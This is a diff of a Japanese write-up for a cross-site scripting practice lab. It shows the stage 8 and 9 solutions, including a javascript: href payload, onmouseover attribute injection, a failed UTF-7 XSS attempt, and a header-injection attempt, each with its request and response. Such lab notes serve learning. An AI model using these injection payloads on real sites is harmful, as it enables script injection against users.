@@ -16,11 +16,7 @@
     - [1 (normal)](#1-normal-1)
     - [2 (bypass \<input value="">)](#2-bypass-%5Cinput-value)
     - [3 (inject \<select>tag)](#3-inject-%5Cselecttag)
-    - [4 (bypas \<input type="hidden" value="">)](#4-bypas-%5Cinput-typehidden-value)
-    - [5 (bypass maxlength="15")](#5-bypass-maxlength15)
-    - [6 (fileter "<>")](#6-fileter-)
-    - [7 (inject \<input value= > with no quote)](#7-inject-%5Cinput-value--with-no-quote)
-    - [8](#8)
+    - [4](#4)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -206,5 +202,79 @@ p1=%22+onclick%3D%22alert%28document.domain%29%3B
 ```txt
 <hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=hogehoge onmouseover=alert(document.domain)> <input type="submit" value="Search">
 ```
-### 8
+### 8 (href)
 ![image](https://user-images.githubusercontent.com/56021519/103074774-a3b50200-460d-11eb-9be0-0634932f4d3d.png)   
+以下のようになる。   
+```txt
+<hr class=red>URL: <a href="aaaa">aaaa</a><hr class=red>
+```
+`javascript:alert(document.domain);`で成功！   
+### 9 (UTF-7 XSS)
+![image](https://user-images.githubusercontent.com/56021519/103074929-f2629c00-460d-11eb-8b0a-8b8bf88063dd.png)   
+
+```txt
+p1=aaaaa&charset=euc-jpbbbbbb
+```
+```txt
+Content-Type: text/html; charset=euc-jpbbbbbb
+Content-Length: 1817
+
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=euc-jpbbbbbb">
+  
+// 省略
+<input type="text" name="p1" size="50" value="aaaaa">
+```
+`"><script>alert(document.domain);</script>`をそれぞれに送信してみると`"`がエスケープされてるぽい。   
+```txt
+Content-Type: text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
+Content-Length: 1934
+
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;">
+  <script language="JavaScript" type="text/javascript" charset="euc-jp" src="script.js">
+```
+以下のように改行をいれたHTTP Header Injectionを試す。   
+```txt
+aaa
+
+<script>alert(document.domain);</script>
+```
+ダメっぽい…   
+```txt
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1868
+
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=euc-jpaaa
+
+&lt;script&gt;alert(document.domain);&lt;/script&gt;">
+```
+IEではcontent-typeが明示されてないと、UTF-7で書かれてると判断してXSSが可能らしい。   
+UTF-7のXSSができるらしいがなんかうまく行ってない…   
+```txt
+p1=ffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29&charset=euc-jpffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29
+```
+これでIEでは`value="ffff" onmouseover="alert(document.domain)">`となっていけるはずだがなんかうまく行ってない   
+IEのバージョンか？   
+writeupでもうまく行かなかったって言ってる。   
+```txt
+Content-Type: text/html; charset=euc-jpffff+ACI- onmouseover=+ACI-alert(document.domain)
+
+<input type="text" name="p1" size="50" value="ffff+ACI- onmouseover=+ACI-alert(document.domain)">
+```
+### 10
+![image](https://user-images.githubusercontent.com/56021519/103078634-a7e51d80-4615-11eb-8338-6714f148dacc.png)   
+
+
+
+
+
+
+
+
+
+
